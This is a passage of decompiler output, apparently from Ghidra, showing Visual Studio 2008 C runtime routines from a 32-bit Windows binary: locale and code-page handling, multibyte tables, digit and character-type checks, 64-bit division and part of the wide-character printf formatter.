    ___crtGetStringTypeA
              ((_locale_t)0x0,1,local_108,0x100,local_508,*(int *)(unaff_ESI + 4),
               *(BOOL *)(unaff_ESI + 0xc));
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x100,local_108,0x100,local_208,
                       0x100,*(int *)(unaff_ESI + 4),0);
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x200,local_108,0x100,local_308,
                       0x100,*(int *)(unaff_ESI + 4),0);
    uVar4 = 0;
    do {
      if ((local_508[uVar4] & 1) == 0) {
        if ((local_508[uVar4] & 2) != 0) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          CVar5 = local_308[uVar4];
          goto LAB_0041ce42;
        }
        *(undefined *)(unaff_ESI + 0x11d + uVar4) = 0;
      }
      else {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        CVar5 = local_208[uVar4];
LAB_0041ce42:
        *(CHAR *)(unaff_ESI + 0x11d + uVar4) = CVar5;
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetmbcinfo
// 
// Library: Visual Studio 2008 Release

pthreadmbcinfo __cdecl ___updatetmbcinfo(void)

{
  _ptiddata p_Var1;
  LONG LVar2;
  pthreadmbcinfo lpAddend;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_0043389c) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    lpAddend = p_Var1->ptmbcinfo;
    if (lpAddend != (pthreadmbcinfo)PTR_DAT_004337a0) {
      if (lpAddend != (pthreadmbcinfo)0x0) {
        LVar2 = InterlockedDecrement(&lpAddend->refcount);
        if ((LVar2 == 0) && (lpAddend != (pthreadmbcinfo)&DAT_00433378)) {
          _free(lpAddend);
        }
      }
      p_Var1->ptmbcinfo = (pthreadmbcinfo)PTR_DAT_004337a0;
      lpAddend = (pthreadmbcinfo)PTR_DAT_004337a0;
      InterlockedIncrement((LONG *)PTR_DAT_004337a0);
    }
    FUN_0041cf59();
  }
  else {
    lpAddend = p_Var1->ptmbcinfo;
  }
  if (lpAddend == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return lpAddend;
}



void FUN_0041cf59(void)

{
  FUN_0041be7c(0xd);
  return;
}



// Library Function - Single Match
//  int __cdecl getSystemCP(int)
// 
// Library: Visual Studio 2008 Release

int __cdecl getSystemCP(int param_1)

{
  UINT UVar1;
  int unaff_ESI;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(localeinfo_struct *)0x0);
  DAT_00436774 = 0;
  if (unaff_ESI == -2) {
    DAT_00436774 = 1;
    UVar1 = GetOEMCP();
  }
  else if (unaff_ESI == -3) {
    DAT_00436774 = 1;
    UVar1 = GetACP();
  }
  else {
    if (unaff_ESI != -4) {
      if (local_8 == '\0') {
        DAT_00436774 = 0;
        return unaff_ESI;
      }
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return unaff_ESI;
    }
    UVar1 = *(UINT *)(local_14[0] + 4);
    DAT_00436774 = 1;
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return UVar1;
}



// Library Function - Single Match
//  __setmbcp_nolock
// 
// Library: Visual Studio 2008 Release

void __cdecl __setmbcp_nolock(undefined4 param_1,int param_2)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  uint uVar4;
  uint uVar5;
  BOOL BVar6;
  undefined2 *puVar7;
  byte *pbVar8;
  int extraout_ECX;
  undefined2 *puVar9;
  int iVar10;
  undefined4 extraout_EDX;
  BYTE *pBVar11;
  threadmbcinfostruct *unaff_EDI;
  uint local_24;
  byte *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  uVar4 = getSystemCP((int)unaff_EDI);
  if (uVar4 != 0) {
    local_20 = (byte *)0x0;
    uVar5 = 0;
LAB_0041d01c:
    if (*(uint *)((int)&DAT_004337a8 + uVar5) != uVar4) goto code_r0x0041d028;
    _memset((void *)(param_2 + 0x1c),0,0x101);
    local_24 = 0;
    pbVar8 = &DAT_004337b8 + (int)local_20 * 0x30;
    local_20 = pbVar8;
    do {
      for (; (*pbVar8 != 0 && (bVar3 = pbVar8[1], bVar3 != 0)); pbVar8 = pbVar8 + 2) {
        for (uVar5 = (uint)*pbVar8; uVar5 <= bVar3; uVar5 = uVar5 + 1) {
          pbVar2 = (byte *)(param_2 + 0x1d + uVar5);
          *pbVar2 = *pbVar2 | (&DAT_004337a4)[local_24];
          bVar3 = pbVar8[1];
        }
      }
      local_24 = local_24 + 1;
      pbVar8 = local_20 + 8;
      local_20 = pbVar8;
    } while (local_24 < 4);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 8) = 1;
    iVar10 = CPtoLCID((int)unaff_EDI);
    *(int *)(param_2 + 0xc) = iVar10;
    puVar7 = (undefined2 *)(param_2 + 0x10);
    puVar9 = (undefined2 *)(&DAT_004337ac + extraout_ECX);
    iVar10 = 6;
    do {
      *puVar7 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar7 = puVar7 + 1;
      iVar10 = iVar10 + -1;
    } while (iVar10 != 0);
    goto LAB_0041d14d;
  }
LAB_0041d009:
  setSBCS(unaff_EDI);
LAB_0041d1b4:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
code_r0x0041d028:
  local_20 = (byte *)((int)local_20 + 1);
  uVar5 = uVar5 + 0x30;
  if (0xef < uVar5) goto code_r0x0041d035;
  goto LAB_0041d01c;
code_r0x0041d035:
  if (((uVar4 == 65000) || (uVar4 == 0xfde9)) ||
     (BVar6 = IsValidCodePage(uVar4 & 0xffff), BVar6 == 0)) goto LAB_0041d1b4;
  BVar6 = GetCPInfo(uVar4,&local_1c);
  if (BVar6 != 0) {
    _memset((void *)(param_2 + 0x1c),0,0x101);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 0xc) = 0;
    if (local_1c.MaxCharSize < 2) {
      *(undefined4 *)(param_2 + 8) = 0;
    }
    else {
      if (local_1c.LeadByte[0] != '\0') {
        pBVar11 = local_1c.LeadByte + 1;
        do {
          bVar3 = *pBVar11;
          if (bVar3 == 0) break;
          for (uVar4 = (uint)pBVar11[-1]; uVar4 <= bVar3; uVar4 = uVar4 + 1) {
            pbVar8 = (byte *)(param_2 + 0x1d + uVar4);
            *pbVar8 = *pbVar8 | 4;
          }
          pBVar1 = pBVar11 + 1;
          pBVar11 = pBVar11 + 2;
        } while (*pBVar1 != 0);
      }
      pbVar8 = (byte *)(param_2 + 0x1e);
      iVar10 = 0xfe;
      do {
        *pbVar8 = *pbVar8 | 8;
        pbVar8 = pbVar8 + 1;
        iVar10 = iVar10 + -1;
      } while (iVar10 != 0);
      iVar10 = CPtoLCID((int)unaff_EDI);
      *(int *)(param_2 + 0xc) = iVar10;
      *(undefined4 *)(param_2 + 8) = extraout_EDX;
    }
    *(undefined4 *)(param_2 + 0x10) = 0;
    *(undefined4 *)(param_2 + 0x14) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
LAB_0041d14d:
    setSBUpLow(unaff_EDI);
    goto LAB_0041d1b4;
  }
  if (DAT_00436774 == 0) goto LAB_0041d1b4;
  goto LAB_0041d009;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_0041d1c3(undefined4 param_1)

{
  _ptiddata p_Var1;
  int iVar2;
  pthreadmbcinfo ptVar3;
  LONG LVar4;
  int *piVar5;
  int iVar6;
  pthreadmbcinfo ptVar7;
  pthreadmbcinfo ptVar8;
  int in_stack_ffffffc8;
  int local_24;
  
  local_24 = -1;
  p_Var1 = __getptd();
  ___updatetmbcinfo();
  ptVar3 = p_Var1->ptmbcinfo;
  iVar2 = getSystemCP(in_stack_ffffffc8);
  if (iVar2 == ptVar3->mbcodepage) {
    local_24 = 0;
  }
  else {
    ptVar3 = (pthreadmbcinfo)__malloc_crt(0x220);
    if (ptVar3 != (pthreadmbcinfo)0x0) {
      ptVar7 = p_Var1->ptmbcinfo;
      ptVar8 = ptVar3;
      for (iVar6 = 0x88; iVar6 != 0; iVar6 = iVar6 + -1) {
        ptVar8->refcount = ptVar7->refcount;
        ptVar7 = (pthreadmbcinfo)&ptVar7->mbcodepage;
        ptVar8 = (pthreadmbcinfo)&ptVar8->mbcodepage;
      }
      ptVar3->refcount = 0;
      local_24 = __setmbcp_nolock(iVar2,(int)ptVar3);
      if (local_24 == 0) {
        LVar4 = InterlockedDecrement(&p_Var1->ptmbcinfo->refcount);
        if ((LVar4 == 0) && (p_Var1->ptmbcinfo != (pthreadmbcinfo)&DAT_00433378)) {
          _free(p_Var1->ptmbcinfo);
        }
        p_Var1->ptmbcinfo = ptVar3;
        InterlockedIncrement((LONG *)ptVar3);
        if (((*(byte *)&p_Var1->_ownlocale & 2) == 0) && (((byte)DAT_0043389c & 1) == 0)) {
          __lock(0xd);
          _DAT_00436784 = ptVar3->mbcodepage;
          _DAT_00436788 = ptVar3->ismbcodepage;
          _DAT_0043678c = *(undefined4 *)ptVar3->mbulinfo;
          for (iVar2 = 0; iVar2 < 5; iVar2 = iVar2 + 1) {
            (&DAT_00436778)[iVar2] = ptVar3->mbulinfo[iVar2 + 2];
          }
          for (iVar2 = 0; iVar2 < 0x101; iVar2 = iVar2 + 1) {
            (&DAT_00433598)[iVar2] = ptVar3->mbctype[iVar2 + 4];
          }
          for (iVar2 = 0; iVar2 < 0x100; iVar2 = iVar2 + 1) {
            (&DAT_004336a0)[iVar2] = ptVar3->mbcasemap[iVar2 + 4];
          }
          LVar4 = InterlockedDecrement((LONG *)PTR_DAT_004337a0);
          if ((LVar4 == 0) && (PTR_DAT_004337a0 != &DAT_00433378)) {
            _free(PTR_DAT_004337a0);
          }
          PTR_DAT_004337a0 = (undefined *)ptVar3;
          InterlockedIncrement((LONG *)ptVar3);
          FUN_0041d324();
        }
      }
      else if (local_24 == -1) {
        if (ptVar3 != (pthreadmbcinfo)&DAT_00433378) {
          _free(ptVar3);
        }
        piVar5 = __errno();
        *piVar5 = 0x16;
      }
    }
  }
  return local_24;
}



void FUN_0041d324(void)

{
  FUN_0041be7c(0xd);
  return;
}



// Library Function - Single Match
//  ___freetlocinfo
// 
// Library: Visual Studio 2008 Release

void __cdecl ___freetlocinfo(void *param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  void *_Memory;
  int **ppiVar3;
  
  _Memory = param_1;
  if ((((*(undefined ***)((int)param_1 + 0xbc) != (undefined **)0x0) &&
       (*(undefined ***)((int)param_1 + 0xbc) != &PTR_DAT_00433c28)) &&
      (*(int **)((int)param_1 + 0xb0) != (int *)0x0)) && (**(int **)((int)param_1 + 0xb0) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0xb8);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_mon(*(int *)((int)param_1 + 0xbc));
    }
    piVar1 = *(int **)((int)param_1 + 0xb4);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_num(*(void ***)((int)param_1 + 0xbc));
    }
    _free(*(void **)((int)param_1 + 0xb0));
    _free(*(void **)((int)param_1 + 0xbc));
  }
  if ((*(int **)((int)param_1 + 0xc0) != (int *)0x0) && (**(int **)((int)param_1 + 0xc0) == 0)) {
    _free((void *)(*(int *)((int)param_1 + 0xc4) + -0xfe));
    _free((void *)(*(int *)((int)param_1 + 0xcc) + -0x80));
    _free((void *)(*(int *)((int)param_1 + 0xd0) + -0x80));
    _free(*(void **)((int)param_1 + 0xc0));
  }
  ppuVar2 = *(undefined ***)(void **)((int)param_1 + 0xd4);
  if ((ppuVar2 != &PTR_DAT_00433b68) && (ppuVar2[0x2d] == (undefined *)0x0)) {
    ___free_lc_time(ppuVar2);
    _free(*(void **)((int)param_1 + 0xd4));
  }
  ppiVar3 = (int **)((int)param_1 + 0x50);
  param_1 = (void *)0x6;
  do {
    if (((ppiVar3[-2] != (int *)&DAT_004338a0) && (piVar1 = *ppiVar3, piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    if (((ppiVar3[-1] != (int *)0x0) && (piVar1 = ppiVar3[1], piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    ppiVar3 = ppiVar3 + 4;
    param_1 = (void *)((int)param_1 + -1);
  } while (param_1 != (void *)0x0);
  _free(_Memory);
  return;
}



// Library Function - Single Match
//  ___addlocaleref
// 
// Library: Visual Studio 2008 Release

void __cdecl ___addlocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  InterlockedIncrement(param_1);
  if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2c]);
  }
  if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2e]);
  }
  if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2d]);
  }
  if ((LONG *)param_1[0x30] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x30]);
  }
  ppLVar2 = (LONG **)(param_1 + 0x14);
  param_1 = (LONG *)0x6;
  do {
    if ((ppLVar2[-2] != (LONG *)&DAT_004338a0) && (*ppLVar2 != (LONG *)0x0)) {
      InterlockedIncrement(*ppLVar2);
    }
    if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
      InterlockedIncrement(ppLVar2[1]);
    }
    ppLVar2 = ppLVar2 + 4;
    param_1 = (LONG *)((int)param_1 + -1);
  } while (param_1 != (LONG *)0x0);
  InterlockedIncrement((LONG *)(pLVar1[0x35] + 0xb4));
  return;
}



// Library Function - Single Match
//  ___removelocaleref
// 
// Library: Visual Studio 2008 Release

LONG * __cdecl ___removelocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2c]);
    }
    if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2e]);
    }
    if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2d]);
    }
    if ((LONG *)param_1[0x30] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x30]);
    }
    ppLVar2 = (LONG **)(param_1 + 0x14);
    param_1 = (LONG *)0x6;
    do {
      if ((ppLVar2[-2] != (LONG *)&DAT_004338a0) && (*ppLVar2 != (LONG *)0x0)) {
        InterlockedDecrement(*ppLVar2);
      }
      if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
        InterlockedDecrement(ppLVar2[1]);
      }
      ppLVar2 = ppLVar2 + 4;
      param_1 = (LONG *)((int)param_1 + -1);
    } while (param_1 != (LONG *)0x0);
    InterlockedDecrement((LONG *)(pLVar1[0x35] + 0xb4));
  }
  return pLVar1;
}



// Library Function - Single Match
//  __updatetlocinfoEx_nolock
// 
// Library: Visual Studio 2008 Release

LONG * __updatetlocinfoEx_nolock(void)

{
  LONG *pLVar1;
  LONG **in_EAX;
  LONG *unaff_EDI;
  
  if ((unaff_EDI != (LONG *)0x0) && (in_EAX != (LONG **)0x0)) {
    pLVar1 = *in_EAX;
    if (pLVar1 != unaff_EDI) {
      *in_EAX = unaff_EDI;
      ___addlocaleref(unaff_EDI);
      if (pLVar1 != (LONG *)0x0) {
        ___removelocaleref(pLVar1);
        if ((*pLVar1 == 0) && (pLVar1 != (LONG *)&DAT_004338a8)) {
          ___freetlocinfo(pLVar1);
        }
      }
    }
    return unaff_EDI;
  }
  return (LONG *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetlocinfo
// 
// Library: Visual Studio 2008 Release

pthreadlocinfo __cdecl ___updatetlocinfo(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_0043389c) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xc);
    __updatetlocinfoEx_nolock();
    FUN_0041d694();
  }
  else {
    p_Var1 = __getptd();
    p_Var1 = (_ptiddata)p_Var1->ptlocinfo;
  }
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x20);
  }
  return (pthreadlocinfo)p_Var1;
}



void FUN_0041d694(void)

{
  FUN_0041be7c(0xc);
  return;
}



// Library Function - Single Match
//  __wchartodigit
// 
// Library: Visual Studio 2008 Release

int __cdecl __wchartodigit(ushort param_1)

{
  int iVar1;
  ushort uVar2;
  
  if (param_1 < 0x30) {
    return -1;
  }
  if (param_1 < 0x3a) {
    return param_1 - 0x30;
  }
  iVar1 = 0xff10;
  if (param_1 < 0xff10) {
    iVar1 = 0x660;
    if (param_1 < 0x660) {
      return -1;
    }
    if (param_1 < 0x66a) goto LAB_0041d6ec;
    iVar1 = 0x6f0;
    if (param_1 < 0x6f0) {
      return -1;
    }
    if (param_1 < 0x6fa) goto LAB_0041d6ec;
    iVar1 = 0x966;
    if (param_1 < 0x966) {
      return -1;
    }
    if (param_1 < 0x970) goto LAB_0041d6ec;
    iVar1 = 0x9e6;
    if (param_1 < 0x9e6) {
      return -1;
    }
    if (param_1 < 0x9f0) goto LAB_0041d6ec;
    iVar1 = 0xa66;
    if (param_1 < 0xa66) {
      return -1;
    }
    if (param_1 < 0xa70) goto LAB_0041d6ec;
    iVar1 = 0xae6;
    if (param_1 < 0xae6) {
      return -1;
    }
    if (param_1 < 0xaf0) goto LAB_0041d6ec;
    iVar1 = 0xb66;
    if (param_1 < 0xb66) {
      return -1;
    }
    if (param_1 < 0xb70) goto LAB_0041d6ec;
    iVar1 = 0xc66;
    if (param_1 < 0xc66) {
      return -1;
    }
    if (param_1 < 0xc70) goto LAB_0041d6ec;
    iVar1 = 0xce6;
    if (param_1 < 0xce6) {
      return -1;
    }
    if (param_1 < 0xcf0) goto LAB_0041d6ec;
    iVar1 = 0xd66;
    if (param_1 < 0xd66) {
      return -1;
    }
    if (param_1 < 0xd70) goto LAB_0041d6ec;
    iVar1 = 0xe50;
    if (param_1 < 0xe50) {
      return -1;
    }
    if (param_1 < 0xe5a) goto LAB_0041d6ec;
    iVar1 = 0xed0;
    if (param_1 < 0xed0) {
      return -1;
    }
    if (param_1 < 0xeda) goto LAB_0041d6ec;
    iVar1 = 0xf20;
    if (param_1 < 0xf20) {
      return -1;
    }
    if (param_1 < 0xf2a) goto LAB_0041d6ec;
    iVar1 = 0x1040;
    if (param_1 < 0x1040) {
      return -1;
    }
    if (param_1 < 0x104a) goto LAB_0041d6ec;
    iVar1 = 0x17e0;
    if (param_1 < 0x17e0) {
      return -1;
    }
    if (param_1 < 0x17ea) goto LAB_0041d6ec;
    iVar1 = 0x1810;
    if (param_1 < 0x1810) {
      return -1;
    }
    uVar2 = 0x181a;
  }
  else {
    uVar2 = 0xff1a;
  }
  if (uVar2 <= param_1) {
    return -1;
  }
LAB_0041d6ec:
  return (uint)param_1 - iVar1;
}



// Library Function - Single Match
//  __iswctype_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __iswctype_l(wint_t _C,wctype_t _Type,_locale_t _Locale)

{
  BOOL BVar1;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  if (_C == 0xffff) {
    local_8[0] = 0;
  }
  else if (_C < 0x100) {
    local_8[0] = *(ushort *)(PTR_DAT_00433b64 + (uint)_C * 2) & _Type;
  }
  else {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
    BVar1 = ___crtGetStringTypeW(&local_18,1,(LPCWSTR)&_C,1,local_8);
    if (BVar1 == 0) {
      local_8[0] = 0;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return (uint)(local_8[0] & _Type);
}



// Library Function - Single Match
//  __aulldvrm
// 
// Library: Visual Studio 2008 Release

undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_char(wchar_t param_1)

{
  wint_t wVar1;
  FILE *in_EAX;
  int *unaff_ESI;
  
  if (((*(byte *)&in_EAX->_flag & 0x40) == 0) || (in_EAX->_base != (char *)0x0)) {
    wVar1 = __fputwc_nolock(param_1,in_EAX);
    if (wVar1 == 0xffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_multi_char(wchar_t param_1,int param_2)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    _write_char(param_1);
  } while (*in_EAX != -1);
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2008 Release

void __thiscall _write_string(void *this,int param_1)

{
  int *in_EAX;
  int *piVar1;
  int unaff_EDI;
  
  if (((*(byte *)(unaff_EDI + 0xc) & 0x40) == 0) || (*(int *)(unaff_EDI + 8) != 0)) {
    while (0 < param_1) {
                    // WARNING: Load size is inaccurate
      param_1 = param_1 + -1;
      _write_char(*this);
      this = (void *)((int)this + 2);
      if (*in_EAX == -1) {
        piVar1 = __errno();
        if (*piVar1 != 0x2a) {
          return;
        }
        _write_char(L'?');
      }
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// Library Function - Single Match
//  __woutput_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __woutput_l(FILE *_File,wchar_t *_Format,_locale_t _Locale,va_list _ArgList)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int *piVar3;
  int *piVar4;
  uint uVar5;
  code *pcVar6;
  int iVar7;
  int extraout_ECX;
  byte *pbVar8;
  int *piVar9;
  byte *pbVar10;
  bool bVar11;
  longlong lVar12;
  int **ppiVar13;
  undefined8 uVar14;
  undefined4 uVar15;
  localeinfo_struct *plVar16;
  int *local_470;
  int *local_46c;
  uint local_468;
  undefined4 local_464;
  int local_460;
  localeinfo_struct local_45c;
  int local_454;
  char local_450;
  int local_44c;
  int *local_448;
  wchar_t *local_444;
  int local_440;
  undefined2 local_43c;
  short local_43a;
  char local_438;
  undefined local_437;
  FILE *local_434;
  int *local_430;
  int local_42c;
  int local_428;
  int local_424;
  int **local_420;
  byte *local_41c;
  byte *local_418;
  int *local_414;
  int *local_410;
  uint local_40c;
  int local_408 [127];
  undefined4 local_209;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  local_434 = _File;
  local_420 = (int **)_ArgList;
  local_44c = 0;
  local_40c = 0;
  local_430 = (int *)0x0;
  local_410 = (int *)0x0;
  local_428 = 0;
  local_440 = 0;
  local_42c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_45c,_Locale);
  if ((local_434 == (FILE *)0x0) || (_Format == (wchar_t *)0x0)) {
    piVar4 = __errno();
    *piVar4 = 0x16;
LAB_0041dacc:
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_450 != '\0') {
      *(uint *)(local_454 + 0x70) = *(uint *)(local_454 + 0x70) & 0xfffffffd;
    }
  }
  else {
    wVar1 = *_Format;
    local_424 = 0;
    local_418 = (byte *)0x0;
    local_448 = (int *)0x0;
    iVar7 = 0;
    while (local_41c = (byte *)(uint)(ushort)wVar1, wVar1 != L'\0') {
      local_444 = _Format + 1;
      if (local_424 < 0) break;
      if ((ushort)(wVar1 + L'') < 0x59) {
        uVar5 = (int)(char)local_41c[0x42b3a0] & 0xf;
      }
      else {
        uVar5 = 0;
      }
      local_460 = (int)(char)(&DAT_0042b3c0)[uVar5 * 8 + iVar7] >> 4;
      switch(local_460) {
      case 0:
switchD_0041db67_caseD_0:
        local_42c = 1;
        _write_char(wVar1);
        break;
      case 1:
        local_410 = (int *)0xffffffff;
        local_464 = 0;
        local_440 = 0;
        local_430 = (int *)0x0;
        local_428 = 0;
        local_40c = 0;
        local_42c = 0;
        break;
      case 2:
        if (local_41c == (byte *)0x20) {
          local_40c = local_40c | 2;
        }
        else if (local_41c == (byte *)0x23) {
          local_40c = local_40c | 0x80;
        }
        else if (local_41c == (byte *)0x2b) {
          local_40c = local_40c | 1;
        }
        else if (local_41c == (byte *)0x2d) {
          local_40c = local_40c | 4;
        }
        else if (local_41c == (byte *)0x30) {
          local_40c = local_40c | 8;
        }
        break;
      case 3:
        if (wVar1 == L'*') {
          local_420 = (int **)((int)_ArgList + 4);
          local_430 = *(int **)_ArgList;
          if ((int)local_430 < 0) {
            local_40c = local_40c | 4;
            local_430 = (int *)-(int)local_430;
          }
        }
        else {
          local_430 = (int *)(local_41c + (int)local_430 * 10 + -0x30);
        }
        break;
      case 4:
        local_410 = (int *)0x0;
        break;
      case 5:
        if (wVar1 == L'*') {
          local_420 = (int **)((int)_ArgList + 4);
          local_410 = *(int **)_ArgList;
          if ((int)local_410 < 0) {
            local_410 = (int *)0xffffffff;
          }
        }
        else {
          local_410 = (int *)(local_41c + (int)local_410 * 10 + -0x30);
        }
        break;
      case 6:
        if (local_41c == (byte *)0x49) {
          wVar2 = *local_444;
          if ((wVar2 == L'6') && (_Format[2] == L'4')) {
            local_444 = _Format + 3;
            local_40c = local_40c | 0x8000;
          }
          else if ((wVar2 == L'3') && (_Format[2] == L'2')) {
            local_444 = _Format + 3;
            local_40c = local_40c & 0xffff7fff;
          }
          else if (((((wVar2 != L'd') && (wVar2 != L'i')) && (wVar2 != L'o')) &&
                   ((wVar2 != L'u' && (wVar2 != L'x')))) && (wVar2 != L'X')) {
            local_460 = 0;
            goto switchD_0041db67_caseD_0;
          }
        }
        else if (local_41c == (byte *)0x68) {
          local_40c = local_40c | 0x20;
        }
        else if (local_41c == (byte *)0x6c) {
          if (*local_444 == L'l') {
            local_444 = _Format + 2;
            local_40c = local_40c | 0x1000;
          }
          else {
            local_40c = local_40c | 0x10;
          }
        }
        else if (local_41c == (byte *)0x77) {
          local_40c = local_40c | 0x800;
        }
        break;
      case 7:
        if (local_41c < (byte *)0x65) {
          if (local_41c == (byte *)0x64) {
LAB_0041e07f:
            local_40c = local_40c | 0x40;
LAB_0041e086:
            local_41c = (byte *)0xa;
LAB_0041e090:
            if (((local_40c & 0x8000) == 0) && ((local_40c & 0x1000) == 0)) {
              local_420 = (int **)((int)_ArgList + 4);
              if ((local_40c & 0x20) == 0) {
                piVar4 = *(int **)_ArgList;
                if ((local_40c & 0x40) == 0) {
                  piVar9 = (int *)0x0;
                }
                else {
                  piVar9 = (int *)((int)piVar4 >> 0x1f);
                }
              }
              else {
                if ((local_40c & 0x40) == 0) {
                  piVar4 = (int *)(uint)*(ushort *)_ArgList;
                }
                else {
                  piVar4 = (int *)(int)*(short *)_ArgList;
                }
                piVar9 = (int *)((int)piVar4 >> 0x1f);
              }
            }
            else {
              piVar4 = *(int **)_ArgList;
              piVar9 = *(int **)((int)_ArgList + 4);
              local_420 = (int **)((int)_ArgList + 8);
            }
            if ((((local_40c & 0x40) != 0) && ((int)piVar9 < 1)) && ((int)piVar9 < 0)) {
